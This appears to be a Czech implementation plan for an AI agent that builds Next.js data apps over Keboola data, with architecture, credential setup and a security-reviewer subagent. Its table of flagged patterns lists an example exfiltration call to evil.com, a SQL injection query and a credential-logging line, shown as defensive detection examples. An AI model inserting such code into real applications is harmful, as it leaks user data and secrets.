# Intelligent Data App Platform - Plán implementace

## Přehled

Platforma pro tvorbu datových aplikací, která:
- **Rozumí datařině** - ví co znamená čištění dat, vizualizace, forecasting, ETL, atd.
- **Zná Keboola ekosystém** - ví jak fungují tabulky, workspaces, transformace, komponenty
- **Inteligentně plánuje** - ptá se správné otázky podle kontextu, ne podle šablon
- **Staví reálné aplikace** - Next.js apps s připojením na Snowflake/data

## Princip

Nejde o předpřipravené šablony ("segment builder", "dashboard").

Jde o **doménové znalosti** - agent rozumí:
- Co uživatel potřebuje když řekne "chci vyčistit data"
- Že k tomu potřebuje vědět JAKÁ data
- Že data jsou v Keboole a musí se k nim připojit
- Jak se připojit (workspace, credentials, Snowflake)
- Jaké UI patterny dávají smysl pro daný use case

## Architektura

### Dvě fáze: Design vs Runtime

**Fáze Design (chat s agentem):**
```
User ↔ Agent ↔ Keboola MCP
                   ↓
            Explorace dat:
            - list_buckets, list_tables
            - get_table (schéma)
            - query_data (sample)
```
Agent používá Keboola MCP pro pochopení struktury dat a exploraci.

**Fáze Runtime (hotová Next.js app):**
```
Next.js App → Direct Snowflake SQL
              (žádné AI, žádné MCP)
```
Finální aplikace je deterministická, spolehlivá, bez AI závislostí.

### Celková architektura

```
┌─────────────────────────────────────────────────────────────────┐
│                         User Message                            │
│         "Potřebuju aplikaci na čištění zákaznických dat"        │
└─────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│              Náš Backend (FastAPI + Claude Agent SDK)           │
│                                                                 │
│   Data Platform Agent                                           │
│   • Doménové znalosti (data engineering, Keboola, UI patterns)  │
│   • Inteligentní plánování a dotazování                         │
│                     ↓                                           │
│   Keboola MCP (lokálně, stdio transport)                        │
│   • Explorace dat: list_buckets, list_tables, get_table         │
│   • SQL dotazy: query_data                                      │
│   • Master Token = automatický workspace                        │
│                     ↓                                           │
│   Security Reviewer (Haiku)                                     │
│   • Kontrola exfiltrace, credential leaks                       │
│   • SQL injection check                                         │
└─────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│              Sandbox (Next.js app)                              │
│   • Direct Snowflake connection (env vars)                      │
│   • Curated komponenty                                          │
│   • Žádné AI, žádné MCP - čistá aplikace                        │
└─────────────────────────────────────────────────────────────────┘
```

## MVP Rozhodnutí

Po review s Codex (OpenAI GPT-5) jsme rozhodli:

| Oblast | MVP Rozhodnutí | Produkce (později) |
|--------|----------------|-------------------|
| **MCP lokace** | Lokální Keboola MCP v backendu (stdio) | Možná E2B sandbox |
| **Auth** | API token v `.env` | OAuth flow |
| **Testovací projekt** | Jeden Keboola projekt, autorizace jednou | Multi-tenant |
| **Credentials do app** | Env vars (export pro lokál, E2B skills pro sandbox) | Secret manager |
| **Security** | Security reviewer agent (Haiku) | + Network restrictions |
| **Logging** | Stávající agent logging | Centralizované logy |
| **Scalability** | Neřešíme (jeden user) | Pool management, quotas |
| **Write-back** | Read-only workspace | Keboola API pro zápis |
| **Component versioning** | Git v lokálním repo | Registry s verzemi |

## Keboola MCP Integrace

### MVP Setup

```bash
# Spuštění Keboola MCP lokálně
uvx keboola_mcp_server --transport stdio
```

**Environment variables:**
```bash
export KBC_STORAGE_API_URL=https://connection.YOUR_REGION.keboola.com
export KBC_STORAGE_TOKEN=your_master_token
# KBC_WORKSPACE_SCHEMA není potřeba s Master Token - vytvoří se automaticky
```

### Klíčové Keboola MCP Tools

Pro **exploraci dat** (design fáze):
- `get_project_info` - kontext projektu
- `list_buckets` / `list_tables` / `get_table` - struktura dat
- `query_data` - SQL dotazy na sample dat
- `search` - hledání tabulek/bucketů

Pro **generovanou app** (runtime):
- App používá **Keboola Query Service API** (ne přímý Snowflake, ne MCP)
- Credentials předáme jako env vars (KBC_URL, KBC_TOKEN, WORKSPACE_ID, BRANCH_ID)

### Workflow

1. Agent používá Keboola MCP pro exploraci
2. Agent pochopí strukturu dat
3. Agent vygeneruje Next.js app s Query Service API voláními
4. Security reviewer zkontroluje kód
5. App dostane Keboola credentials jako env vars
6. App běží nezávisle (žádné MCP, žádné AI)

## Keboola Query Service API

### Python SDK

Pro backend (Python) je k dispozici oficiální SDK:

```bash
pip install keboola-query-service
```

**PyPI:** https://pypi.org/project/keboola-query-service/

**Použití:**
```python
from keboola_query_service import Client

with Client(
    base_url="https://query.keboola.com",
    token="your-storage-api-token"
) as client:
    results = client.execute_query(
        branch_id="123",
        workspace_id="456",
        statements=["SELECT * FROM table LIMIT 10"]
    )
    for result in results:
        print(result.data)
```

Pro nápovědu: `from keboola_query_service import Client; help(Client)`

### TypeScript/Next.js SDK

Pro frontend (Next.js API routes) je k dispozici oficiální SDK:

```bash
npm install @keboola/query-service
```

**npm:** https://www.npmjs.com/package/@keboola/query-service

**Použití:**
```typescript
import { Client } from '@keboola/query-service';

const client = new Client({
  baseUrl: 'https://query.keboola.com',
  token: 'your-storage-api-token'
});

const results = await client.executeQuery({
  branchId: '123',
  workspaceId: '456',
  statements: ['SELECT * FROM table LIMIT 10']
});
```

**Curated wrapper:** `components/curated/keboola.ts` - zjednodušený wrapper nad SDK s funkcemi `queryData()`, `listSchemas()`, `listTables()`

## Credentials Management

### Lokální vývoj

```bash
# Před spuštěním Next.js app
export KBC_URL=https://connection.keboola.com/
export KBC_TOKEN=your-storage-api-token
export WORKSPACE_ID=123456
export BRANCH_ID=789

cd /tmp/app-builder/session_123
npm run dev
```

### E2B Sandbox (později)

```python
# Pomocí E2B skills
sandbox.set_env("KBC_URL", "https://connection.keboola.com/")
sandbox.set_env("KBC_TOKEN", credentials.token)
sandbox.set_env("WORKSPACE_ID", credentials.workspace_id)
sandbox.set_env("BRANCH_ID", credentials.branch_id)
```

### V generované aplikaci

```typescript
// lib/keboola.ts (z curated komponent)
// Query Service URL se odvozuje z KBC_URL (connection. -> query.)
// Viz components/curated/keboola.ts pro kompletní implementaci
```

## Security

### Security Reviewer Agent

Nový subagent pro bezpečnostní kontrolu generovaného kódu:

```python
"security-reviewer": AgentDefinition(
    description="Reviews generated code for security issues and SQL injection.",
    prompt="""You are a security code reviewer.

## Your Task
Review the generated Next.js application code for:

1. **Data exfiltration** - code sending data to external endpoints
2. **Credential leaks** - logging or exposing environment variables
3. **Unauthorized actions** - doing things user didn't ask for
4. **Malicious patterns** - eval(), dangerous imports, etc.
5. **SQL Injection** - user input going directly into SQL queries

## SQL Injection Patterns to Flag
- String concatenation in SQL: `SELECT * FROM users WHERE id = ${userId}`
- Template literals with user input in queries
- Missing parameterized queries
- User input in ORDER BY, LIMIT without validation
- Dynamic table/column names from user input

## Safe Patterns (OK)
- Parameterized queries with placeholders
- Whitelisted values for dynamic parts
- Input validation before query

## Output
Return JSON:
{
  "safe": true/false,
  "issues": [
    {
      "severity": "high|medium|low",
      "type": "sql_injection|exfiltration|credential_leak|...",
      "file": "...",
      "line": N,
      "description": "...",
      "fix_suggestion": "..."
    }
  ],
  "summary": "Brief assessment"
}
""",
    tools=["Read", "Glob", "Grep"],
    model="haiku"
)
```

### Security Workflow

1. Agent vygeneruje app
2. **Security reviewer proběhne před spuštěním dev serveru**
3. Pokud `safe: false` s high severity → agent musí opravit
4. Pokud `safe: true` → pokračuje se

### Co kontrolujeme

| Typ | Severity | Příklad |
|-----|----------|---------|
| SQL Injection | High | `query(\`SELECT * FROM ${userInput}\`)` |
| Data Exfiltration | High | `fetch('https://evil.com', {body: data})` |
| Credential Leak | High | `console.log(process.env.SNOWFLAKE_PASSWORD)` |
| Unauthorized Action | Medium | Kód dělá něco co user nežádal |
| Unsafe Pattern | Medium | `eval()`, `dangerouslySetInnerHTML` s user input |

## Doménové znalosti

### Co agent musí vědět

**1. Data Engineering Patterns**
```
- ETL/ELT procesy
- Data cleaning (deduplikace, validace, normalizace)
- Data quality monitoring
- Transformace a agregace
- Time series analýza
- Forecasting metody
```

**2. Keboola Platforma**
```
- Storage API - buckets, tabulky, sloupce
- Workspaces - read-only přístup k datům
- Transformace - SQL, Python, R
- Komponenty - extraktory, writery
- Flows - orchestrace
- Data Apps - Streamlit, custom apps
```

**3. UI Patterns pro Data Apps**
```
- Data tables s filtrováním a řazením
- Grafy a vizualizace (line, bar, scatter, heatmap...)
- Formuláře pro editaci dat
- Dashboardy s KPIs
- Interaktivní filtry
- Export functionality
```

**4. Snowflake/SQL**
```
- Connection management
- Query optimization
- Read-only best practices
- Handling large datasets
- Parameterized queries (security)
```

### Jak agent přemýšlí

Příklad: User řekne "Potřebuju aplikaci na forecasting prodejů"

Agent si uvědomí:
1. **Forecasting** = potřebuju historická data s časovou dimenzí
2. **Prodeje** = pravděpodobně tabulka s date, amount, možná product/region
3. **K tomu potřebuju**:
   - Přístup k datům → použiju Keboola MCP pro exploraci
   - Vědět jaká tabulka → `list_tables`, `get_table`
   - Sample dat → `query_data`
   - Time granularity → zeptám se usera
   - Forecast horizon → zeptám se usera
4. **UI bude potřebovat**:
   - Line chart s historií a predikcí
   - Confidence intervals
   - Možná drill-down by product/region
   - Export výsledků

Agent se zeptá relevantní otázky, ne generické "jaká data chcete použít?"

## Curated Component Library

### Princip

Máme knihovnu **odladěných UI komponent** jako **funkční boilerplate**.
Agent je použije jako základ a může je upravit podle potřeby uživatele.

```
User: "Ukaž mi sample dat z tabulky customers"

Bez knihovny:
→ Agent vygeneruje nějakou tabulku, pokaždé jinak, často s bugy

S knihovnou:
→ Agent zkopíruje DataTable jako boilerplate
→ Má funkční základ, může upravit pro specifické potřeby
→ Konzistentní look & feel, otestovaný kód
```

### Komponenty jako Boilerplate (ne rigid library)

**Klíčový princip:** Agent dostane hotovou, funkční komponentu a může si ji upravit.

```
1. Agent ví že existuje DataTable komponenta
2. Agent ji zkopíruje do sandboxu jako základ
3. Agent může:
   - Použít as-is (nejčastější případ)
   - Upravit props, přidat sloupce
   - Změnit styling
   - Rozšířit funkcionalitu
4. Výsledek je vždy funkční, protože začal z funkčního základu
```

**Výhody:**
- Žádné "vymýšlení kola" - agent má ověřený kód
- Flexibilita - úpravy podle potřeby
- Konzistence - základní patterns jsou stejné
- Rychlost - nemusí generovat vše od nuly

### Struktura knihovny

```
/components/curated/
├── registry.json              # Seznam komponent pro agenta
├── data-table/
│   ├── DataTable.tsx          # Hlavní komponenta
│   ├── KeboolaStoragePicker.tsx
│   ├── usage.md               # Kdy a jak použít (agent to čte)
│   └── index.ts               # Exporty
├── chart-line/
│   ├── LineChart.tsx
│   └── usage.md
└── keboola.ts                 # Shared Keboola Query API client
```

### Component Registry

Agent potřebuje vědět jaké komponenty má k dispozici:

**`registry.json`:**
```json
{
  "components": [
    {
      "name": "DataTable",
      "path": "data-table/DataTable.tsx",
      "description": "Interactive data table with sorting, filtering, pagination, column visibility",
      "useWhen": [
        "display tabular data",
        "show query results",
        "data exploration",
        "CRUD interface"
      ],
      "features": [
        "Auto-generated columns from data",
        "Global search",
        "Column sorting",
        "Pagination with configurable page size",
        "Column visibility toggle",
        "Expandable truncated cells",
        "Loading skeleton"
      ],
      "dependencies": ["@tanstack/react-table", "lucide-react"]
    },
    {
      "name": "KeboolaStoragePicker",
      "path": "data-table/KeboolaStoragePicker.tsx",
      "description": "Schema and table picker for Keboola storage with instant navigation",
      "useWhen": [
        "user needs to select Keboola table",
        "data source selection",
        "storage browser"
      ],
      "features": [
        "Preloads all schemas and tables",
        "Instant schema/table switching",
        "Loading indicator",
        "Connection status"
      ]
    }
  ],
  "shared": [
    {
      "name": "keboola",
      "path": "keboola.ts",
      "description": "Keboola Query API client for data fetching",
      "exports": ["queryData", "listSchemas", "listTables"]
    }
  ],
  "uiPrimitives": [
    "components/ui/button.tsx",
    "components/ui/input.tsx",
    "components/ui/table.tsx",
    "components/ui/dropdown-menu.tsx",
    "components/ui/badge.tsx",
    "components/ui/skeleton.tsx"
  ]
}
```

### Agent Workflow

```
1. User: "Chci aplikaci na prohlížení dat z Keboola"

2. Agent čte registry.json:
   → Vidí DataTable + KeboolaStoragePicker
   → Čte jejich usage.md pro detaily

3. Agent vytváří sandbox:
   → Zkopíruje komponenty do sandboxu
   → Zkopíruje shared utilities (keboola.ts)
   → Zkopíruje UI primitives

4. Agent generuje app:
   → Import z lokálních souborů (ne npm)
   → Může upravit komponenty podle potřeby
   → Propojí s Keboola credentials z env

5. Výsledek:
   → Funkční app postavená na ověřených komponentách
   → Konzistentní UX
   → Agent strávil čas logikou, ne UI bugfixing
```

### Injekce do Sandboxu

Při vytváření nové aplikace:

```python
# Backend při vytváření sandboxu
def setup_sandbox(sandbox_path: str):
    # 1. Zkopírovat curated komponenty
    shutil.copytree(
        "components/curated/",
        f"{sandbox_path}/components/curated/"
    )

    # 2. Zkopírovat UI primitives
    shutil.copytree(
        "components/curated/components/ui/",
        f"{sandbox_path}/components/ui/"
    )

    # 3. Zkopírovat shared utilities
    shutil.copy(
        "components/curated/lib/utils.ts",
        f"{sandbox_path}/lib/utils.ts"
    )
```

### Verzování

- Komponenty jsou v git repu
- Verzování přes git tags/commits
- Pro MVP stačí, pro produkci možná registry

### Override mechanismus

User může říct:
- "Použij jinou knihovnu na tabulky" → Agent nepoužije curated
- "Chci vlastní design" → Agent vygeneruje custom
- "Uprav tabulku aby měla X" → Agent upraví zkopírovanou komponentu

Agent defaultně preferuje curated jako základ, ale respektuje explicitní požadavky.

## Implementační fáze

### Fáze 1: Domain Knowledge System Prompt ✅ DONE

**Soubory:**
- `backend/app/prompts/data_platform.py` - doménové znalosti ✅

**Úkoly:**
1. ✅ Napsat obsáhlý system prompt s doménovými znalostmi
2. ✅ Zahrnout Keboola specifika
3. ✅ Zahrnout data engineering patterns
4. ✅ Definovat jak agent přemýšlí a ptá se

**Implementováno:**
- `DATA_PLATFORM_KNOWLEDGE` - data engineering concepts, Keboola platform
- `CURATED_COMPONENTS_KNOWLEDGE` - component library usage
- `KEBOOLA_MCP_KNOWLEDGE` - MCP tools for data exploration
- Integrováno do `agent.py` via import

### Fáze 2: Curated Component Library 🔶 IN PROGRESS

**Soubory:**
- `components/curated/` - knihovna komponent

**Úkoly:**
1. ✅ Vytvořit základní komponenty (DataTable, KeboolaStoragePicker)
2. ✅ `keboola.ts` používá Query Service API (ne přímý Snowflake)
3. ⏳ Napsat usage.md pro komponenty
4. ⏳ Aktualizovat registr komponent (`components.json`)
5. ~~Automatická injekce do sandboxu~~ → N/A (lokální mode, agent kopíruje sám)

### Fáze 3: Keboola MCP Integration

**Soubory:**
- `backend/app/integrations/keboola_mcp.py` - MCP integrace

**Úkoly:**
1. Integrace Keboola MCP do Claude Agent SDK
2. Master Token setup (automatický workspace)
3. Hlavní tools: `list_buckets`, `list_tables`, `get_table`, `query_data`

### Fáze 4: Data Context Injection

**Soubory:**
- `backend/app/context/data_context.py` - správa credentials

**Úkoly:**
1. Získání Snowflake credentials z workspace
2. Env vars setup pro lokální vývoj
3. E2B skills setup pro sandbox

### Fáze 5: Security Reviewer

**Soubory:**
- Upravit `backend/app/agent.py` - přidat security-reviewer subagent

**Úkoly:**
1. Implementovat security-reviewer agent (Haiku)
2. Kontrola exfiltrace, credential leaks, SQL injection
3. Hook před spuštěním dev serveru
4. Workflow: fail → agent opraví → retry

### Fáze 6: Interactive Planning Flow

**Soubory:**
- Upravit `backend/app/agent.py` - planning capabilities

**Úkoly:**
1. Agent umí vést dialog před stavěním
2. Sbírá potřebné informace inteligentně
3. Používá Keboola MCP pro exploraci
4. Teprve pak staví

## Příklady Use Cases

Agent zvládne široké spektrum požadavků bez předpřipravených šablon:

**Data Exploration**
- "Chci prozkoumat strukturu našich dat"
- "Ukaž mi co máme v tabulce customers"

**Visualization**
- "Potřebuju dashboard prodejů"
- "Vizualizace trendů za poslední rok"

**Data Quality**
- "Aplikace na čištění duplicit"
- "Validace datové kvality"

**Analytics**
- "Forecasting příštího kvartálu"
- "Cohort analýza zákazníků"

**Operational**
- "Nástroj na manuální opravu dat"
- "Interface pro schvalování změn"

Agent rozpozná kontext a zeptá se na relevantní věci.

## Pro budoucí produkci (mimo MVP)

Věci které teď neřešíme, ale budeme potřebovat:

1. **OAuth flow** - místo API tokenu v .env
2. **Multi-tenant** - více uživatelů, více projektů
3. **Write-back** - zápis do Keboola přes API
4. **Network restrictions** - egress rules pro sandboxy
5. **Centralizované logování** - audit trail
6. **Sandbox pool management** - scalability
7. **Credential rotation** - TTL, refresh
8. **Component registry** - verzování s UI

## Závislosti

```
# Python packages (viz requirements.txt)
keboola-query-service>=0.1.1    # Keboola Query Service SDK
# Keboola MCP se spouští přes uvx (keboola_mcp_server)
```

**Poznámka:** Nepotřebujeme přímé Snowflake připojení - vše jde přes Keboola Query Service API.

## Fáze 0: Setup & Explorace (PRE-DEVEL)

Praktická příprava před hlavní implementací - ověření že všechno funguje.

### 0.1 Ověření Keboola připojení

**Cíl:** Ověřit že existující credentials v `.env` fungují.

```bash
# Máme v .env:
KBC_URL=https://connection.keboola.com/
KBC_TOKEN=xxx
WORKSPACE_ID=xxx
BRANCH_ID=xxx
```

**Test script:** `scripts/test_keboola_connection.py`
- Otestuje Query Service API (jako example1.py)
- Vypíše dostupné tabulky
- Vrátí sample dat

### 0.2 Vyzkoušení Keboola MCP

**Cíl:** Rozběhnout Keboola MCP server a otestovat jeho tools.

```bash
# Instalace
pip install keboola-mcp-server

# Spuštění (stdio mode)
uvx keboola_mcp_server --transport stdio
```

**MCP Environment:**
```bash
export KBC_STORAGE_API_URL=https://connection.keboola.com
export KBC_STORAGE_TOKEN=xxx  # Master token nebo storage token
```

**Test tools:**
- `get_project_info` - info o projektu
- `list_buckets` - seznam bucketů
- `list_tables` - tabulky v bucketu
- `get_table` - schéma tabulky
- `query_data` - SQL query

**Výstup:** `scripts/explore_keboola_mcp.py` - skript pro interaktivní exploraci

### 0.3 První UI komponenta: DataTable

**Cíl:** Vytvořit odladěnou DataTable komponentu a malou testovací Next.js app.

**Postup:**
1. Vytvořit minimální Next.js app v `sandbox-template/`
2. Přidat Snowflake connector
3. Implementovat DataTable komponentu
4. Otestovat na reálných datech z Keboola workspace

**Výstup:**
```
components/curated/data-table/
├── DataTable.tsx       # Odladěná komponenta
├── usage.md            # Dokumentace pro agenta
└── example.tsx         # Příklad použití
```

### 0.4 Získání Snowflake credentials z workspace

**Cíl:** Pochopit jak získat Snowflake credentials pro přímé SQL dotazy.

Keboola workspace poskytuje Snowflake credentials:
- Account, User, Password
- Database, Schema
- Warehouse

**Test:** Script který získá credentials a provede přímý Snowflake dotaz.

### Checklist Fáze 0

- [x] Query Service API funguje (existující .env) ✅ `scripts/test_keboola_connection.py`
- [x] Keboola MCP server běží a odpovídá ✅ `scripts/test_keboola_mcp.py`
- [x] MCP tools fungují (list_buckets, list_tables, query_data) ✅ 33 tools available
- [x] ~~Máme Snowflake credentials z workspace~~ → Query Service API (nepotřebujeme přímé Snowflake credentials)
- [x] DataTable komponenta je hotová a otestovaná ✅ `components/curated/data-table/`
- [x] Testovací Next.js app se připojí na data ✅ `components/curated/` (port 3333)

---

## Pořadí implementace

**Fáze 0: Setup & Explorace** ← NOVÁ (teď)
0. Ověření Keboola připojení
1. Vyzkoušení Keboola MCP
2. První UI komponenta (DataTable)
3. Snowflake credentials workflow

**Fáze 1-6: Hlavní implementace** (po Fázi 0)
1. **Domain Knowledge Prompt** - základní inteligence agenta
2. **Curated Component Library** - konzistentní UI
3. **Keboola MCP Integration** - připojení k datům
4. **Data Context Injection** - credentials do sandboxu
5. **Security Reviewer** - bezpečnostní kontrola
6. **Interactive Planning** - lepší dialog s uživatelem

Fáze 0 je praktická příprava, Fáze 1-2 jsou základ, 3-4 přidají data, 5-6 vylepší bezpečnost a UX.
